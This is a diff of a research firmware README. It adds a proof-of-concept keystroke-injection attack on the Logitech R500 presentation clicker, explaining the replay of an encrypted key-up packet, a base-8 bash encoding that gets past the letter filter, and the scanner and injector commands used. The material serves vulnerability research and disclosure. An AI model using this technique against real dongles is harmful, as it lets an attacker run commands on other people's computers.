@@ -2,7 +2,7 @@
 
 I was in the mood for some RF reverse-engineering, so I ordered a few presentation clickers and had a bit of fun. 
 
-This is a fork of [nrf-research-firmware](readme-original.md) (which I wrote a few years ago at Bastille). I've added support for a few new transceivers/protocols, and included keystroke injection POCs for 12 common presentation clickers.
+This is a fork of [nrf-research-firmware](readme-original.md) (which I wrote a few years ago at Bastille). I've added support for a few new transceivers/protocols, and included keystroke injection POCs for 13 common presentation clickers.
 
 ## History
 
@@ -25,8 +25,66 @@ This is a fork of [nrf-research-firmware](readme-original.md) (which I wrote a f
 | Rii | [Wireless Presenter](https://www.amazon.com/Rii-Wireless-Presenter-PowerPoint-Presentation/dp/B07H9VSG3G/) | [Rii Wireless Presenter](#Rii-Wireless-Presenter) | BK2451 | 2019-04-21 |
 | Logitech | [R400](https://www.amazon.com/Logitech-Wireless-Presenter-Presentation-Pointer/dp/B002GHBUTK/) | [Logitech Unencrypted](#Logitech-Unencrypted) | nRF24 | 2019-04-21 |
 | Logitech | [R800](https://www.amazon.com/Logitech-Professional-Presenter-Presentation-Wireless/dp/B002GHBUTU/) | [Logitech Unencrypted](#Logitech-Unencrypted) | nRF24 | 2019-04-21 |
+| Logitech | [R500](https://www.amazon.com/Logitech-Presentation-Connectivity-Bluetooth-PowerPoint/dp/B07CC7DMX8/) | [Logitech Encrypted](#Logitech-Encrypted) | nRF24 | 2019-04-21 |
 
 ## Protocols
+
+### Logitech Encrypted
+
+#### Overview
+
+This is the standard encrypted Logitech keyboard protocol, as used by the R500. It's sort-of vulnerable to the "encrypted keystroke injection" attack I documented with Logitech Unifying keyboards as part of the MouseJack project.
+
+I say *sort-of*, because not all HID scan codes are accepted. Specifically, 0x04-0x1D (A-Z) are replaced by 0x00 when the dongle sends the packet to the host computer, which means we can inject whatever we want, as long as it isn't a letter. The other exception is that ctrl key-chords *are* allowed, even when they include letters.
+
+Effective keystroke injection via the R500 requires that we get a little creative. 
+
+Let's assume the target is in a bash session. In bash, we can encode our characters in base-8, encoding commands containing letters that we want our target to execute. 
+
+For instance, `ping google.com` is encoded as `$'\160\151\156\147' $'\147\157\157\147\154\145\056\143\157\155'`. If we send this string to a bash session and then send `enter`, the command `ping google.com` will be invoked on the target machine. 
+
+#### Device Discovery
+
+You can find the address of your Logitech R500 using `nrf24-scanner` as follows:
+
+```sudo ./tools/nrf24-scanner.py -c {2..74..3} -l```
+
+Packets should look something like this:
+
+```
+[2019-04-21 13:11:52.507]  62   5  85:D1:9D:FE:07  00:40:00:08:B8
+[2019-04-21 13:11:52.515]  62   5  85:D1:9D:FE:07  00:40:00:08:B8
+[2019-04-21 13:11:52.523]  62  22  85:D1:9D:FE:07  00:D3:4D:6F:B6:1B:E6:05:A2:B4:8B:98:F9:C2:00:00:00:00:00:00:00:81
+```
+
+#### Injection
+
+Injection is possible because the dongle doesn't enforce incementing AES counters, so you can replay packets. A packet sent OTA is made up of a USB HID payload which has been encrypted in AES counter mode, and then the counter. When you press a button on the presentation clicker, it generates a key down packet, and a key up packet. The key up packet is all 0's, which gives us nice and clean key material that we can reuse, XOR with our own payload, and send OTA.
+
+It shouldn't be hard to automate the process of listening for a button press, pulling out the second (key up) packet, and automatically using it for the key-material reference. But I'm lazy, so you'll first need to watch a button press yourself, which looks like this:
+
+```
+[2019-04-21 16:02:56.451]  65   5  85:D1:9D:FE:07  00:40:00:08:B8
+[2019-04-21 16:02:56.459]  65   5  85:D1:9D:FE:07  00:40:00:08:B8
+[2019-04-21 16:02:56.468]  65  22  85:D1:9D:FE:07  00:D3:E6:7B:35:8C:BB:2C:7D:5B:8B:98:FA:76:00:00:00:00:00:00:00:B9
+[2019-04-21 16:02:56.475]  65   5  85:D1:9D:FE:07  00:40:00:08:B8
+[2019-04-21 16:02:56.507]  65   5  85:D1:9D:FE:07  00:40:00:08:B8
+[2019-04-21 16:02:56.516]  65  22  85:D1:9D:FE:07  00:D3:99:D6:D3:8D:49:25:F5:4D:8B:98:FA:77:00:00:00:00:00:00:00:1A
+[2019-04-21 16:02:56.524]  65   5  85:D1:9D:FE:07  00:40:00:08:B8
+[2019-04-21 16:02:56.532]  65   5  85:D1:9D:FE:07  00:40:00:08:B8
+``` 
+
+The second 22-byte packet is the key-up packet. 
+
+**Remove the last byte of the payload, and copy and paste the string into logitech.py, replacing KEYUP_REF.**
+
+(It *shouldn't* work without updating `KEYUP_REF`, but if it does, please let me know!)
+
+#### Injection
+
+Inject the bash `ping google.com` base-8-encoded keystroke sequence into a specific Logitech R500 dongle (address `85:D1:9D:FE:07`):
+
+```sudo ./tools/r500-injector.py -l -a 85:D1:9D:FE:07```
 
 ### Logitech Unencrypted
 
